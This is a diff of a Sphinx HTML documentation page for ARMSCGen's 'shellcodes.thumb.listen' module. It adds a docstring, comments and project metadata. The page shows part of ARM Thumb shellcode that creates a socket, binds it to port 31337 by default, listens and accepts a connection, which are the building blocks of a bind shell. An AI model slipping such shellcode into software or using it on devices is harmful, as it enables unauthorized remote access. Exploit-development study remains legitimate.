@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 
@@ -6,7 +8,7 @@
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     
-    <title>shellcodes.thumb.listen &mdash; ..  documentation</title>
+    <title>shellcodes.thumb.listen &mdash; ARMSCGen  documentation</title>
     
     <link rel="stylesheet" href="../../../_static/default.css" type="text/css" />
     <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
@@ -23,7 +25,7 @@
     <script type="text/javascript" src="../../../_static/jquery.js"></script>
     <script type="text/javascript" src="../../../_static/underscore.js"></script>
     <script type="text/javascript" src="../../../_static/doctools.js"></script>
-    <link rel="top" title="..  documentation" href="../../../index.html" />
+    <link rel="top" title="ARMSCGen  documentation" href="../../../index.html" />
     <link rel="up" title="Module code" href="../../index.html" /> 
   </head>
   <body>
@@ -36,7 +38,7 @@
         <li class="right" >
           <a href="../../../py-modindex.html" title="Python Module Index"
              >modules</a> |</li>
-        <li><a href="../../../index.html">..  documentation</a> &raquo;</li>
+        <li><a href="../../../index.html">ARMSCGen  documentation</a> &raquo;</li>
           <li><a href="../../index.html" accesskey="U">Module code</a> &raquo;</li> 
       </ul>
     </div>  
@@ -52,7 +54,16 @@
 <span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="n">ntohs</span>
 
 <div class="viewcode-block" id="generate"><a class="viewcode-back" href="../../../shellcodes.thumb.html#shellcodes.thumb.listen.generate">[docs]</a><span class="k">def</span> <span class="nf">generate</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="mi">31337</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;listens on specific port</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        port(int): specific prot</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        ``r6`` reg indicates socket descriptor</span>
+<span class="sd">    &quot;&quot;&quot;</span>
     <span class="n">sc</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;</span>
+<span class="s">    /* socket(AF_INET, SOCK_STREAM, ...) */</span>
 <span class="s">    mov r0, #2</span>
 <span class="s">    mov r1, #1</span>
 <span class="s">    sub r2, r2, r2</span>
@@ -61,6 +72,9 @@
 <span class="s">    add r7, r7, #26</span>
 <span class="s">    svc 1</span>
 
+<span class="s">    /* backup socket descriptor r6 </span>
+<span class="s">       bind(...)</span>
+<span class="s">    */</span>
 <span class="s">    mov r6, r0</span>
 <span class="s">    #adr r4, sockaddr_in_1</span>
 <span class="s">    mov r4, pc</span>
@@ -78,10 +92,12 @@
 
 <span class="s">    b after_sockaddr_in_2</span>
 
+<span class="s">    /* sockaddr_in struct(...) */</span>
 <span class="s">sockaddr_in_1:</span>
 <span class="s">    .short 2</span>
 <span class="s">    .short </span><span class="si">%s</span><span class="s"></span>
 
+<span class="s">    /* listen(...) */</span>
 <span class="s">after_sockaddr_in_2:</span>
 <span class="s">    mov r1, #16</span>
 <span class="s">    mov r0, r6</span>
@@ -90,6 +106,7 @@
 <span class="s">    add r7, r7, #29</span>
 <span class="s">    svc 1</span>
 
+<span class="s">    /* accept(...) */</span>
 <span class="s">    mov r0, r6</span>
 <span class="s">    sub r1, r1, r1</span>
 <span class="s">    sub r2, r2, r2</span>
@@ -132,13 +149,13 @@
         <li class="right" >
           <a href="../../../py-modindex.html" title="Python Module Index"
              >modules</a> |</li>
-        <li><a href="../../../index.html">..  documentation</a> &raquo;</li>
+        <li><a href="../../../index.html">ARMSCGen  documentation</a> &raquo;</li>
           <li><a href="../../index.html" >Module code</a> &raquo;</li> 
       </ul>
     </div>
     <div class="footer">
-        &copy; Copyright 2014, Author.
-      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.2b1.
+        &copy; Copyright 2014, alex.park.
+      Created using <a href="http://sphinx.pocoo.org/">Sphinx</a> 1.1.3.
     </div>
   </body>
 </html>
